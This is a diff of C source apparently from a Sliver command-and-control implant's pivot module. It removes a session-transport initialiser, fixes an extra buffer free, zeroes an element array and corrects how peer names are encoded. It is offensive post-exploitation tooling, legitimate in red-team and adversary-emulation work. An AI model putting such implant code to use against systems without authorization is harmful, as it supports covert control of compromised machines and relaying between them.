@@ -1,37 +1,5 @@
 #include "pch.h"
 
-PSLIVER_SESSION_CLIENT PivotInit
-(
-	_In_ PGLOBAL_CONFIG pGlobalConfig
-)
-{
-	PSLIVER_SESSION_CLIENT pSessionClient = NULL;
-	UINT64 uReconnectDuration = 300;
-	DWORD dwPollInterval = 1.5;
-
-	pSessionClient = ALLOC(sizeof(SLIVER_BEACON_CLIENT));
-	pSessionClient->pGlobalConfig = pGlobalConfig;
-	pSessionClient->dwPollInterval = dwPollInterval;
-#ifdef _HTTP
-	pSessionClient->Init = (CLIENT_INIT)HttpInit;
-	pSessionClient->Start = HttpStart;
-	pSessionClient->Send = HttpSend;
-	pSessionClient->Receive = HttpRecv;
-	pSessionClient->Close = HttpClose;
-	pSessionClient->Cleanup = HttpCleanup;
-#elif _TCP
-	pSessionClient->Init = (CLIENT_INIT)TcpInit;
-	pSessionClient->Start = TcpStart;
-	pSessionClient->Send = TcpSend;
-	pSessionClient->Receive = TcpRecv;
-	pSessionClient->Close = TcpClose;
-	pSessionClient->Cleanup = TcpCleanup;
-#endif
-
-CLEANUP:
-	return pSessionClient;
-}
-
 PBUFFER MarshalPivotHello
 (
 	PGLOBAL_CONFIG pGlobalConfig
@@ -80,7 +48,6 @@ PPIVOT_HELLO UnmarshalPivotHello
 
 	if (UnmarshaledData != NULL) {
 		FreeBuffer((PBUFFER)UnmarshaledData[2]);
-		FreeBuffer((PBUFFER)UnmarshaledData[3]);
 		FREE(UnmarshaledData);
 	}
 
@@ -177,6 +144,7 @@ PBUFFER MarhsalPivotPeerEnvelope
 	DWORD i = 0;
 	PPBElement* ElementList = NULL;
 
+	SecureZeroMemory(PivotPeerEnvelopeElement, sizeof(PivotPeerEnvelopeElement));
 	PivotPeerEnvelopeElement[1] = CreateVarIntElement(pEnvelope->uType, 2);
 	if (pEnvelope->pData != NULL) {
 		PivotPeerEnvelopeElement[3] = CreateBytesElement(pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, 4);
@@ -191,7 +159,7 @@ PBUFFER MarhsalPivotPeerEnvelope
 		ElementList = ALLOC(sizeof(PPBElement) * pEnvelope->cPivotPeers);
 		for (i = 0; i < pEnvelope->cPivotPeers; i++) {
 			PivotPeerElement[0] = CreateVarIntElement(pEnvelope->PivotPeers[i]->uPeerID, 1);
-			PivotPeerElement[1] = CreateVarIntElement(pEnvelope->PivotPeers[i]->lpName, lstrlenA(pEnvelope->PivotPeers[i]->lpName), 2);
+			PivotPeerElement[1] = CreateBytesElement(pEnvelope->PivotPeers[i]->lpName, lstrlenA(pEnvelope->PivotPeers[i]->lpName), 2);
 			ElementList[i] = CreateStructElement(PivotPeerElement, _countof(PivotPeerElement), 0);
 		}
 
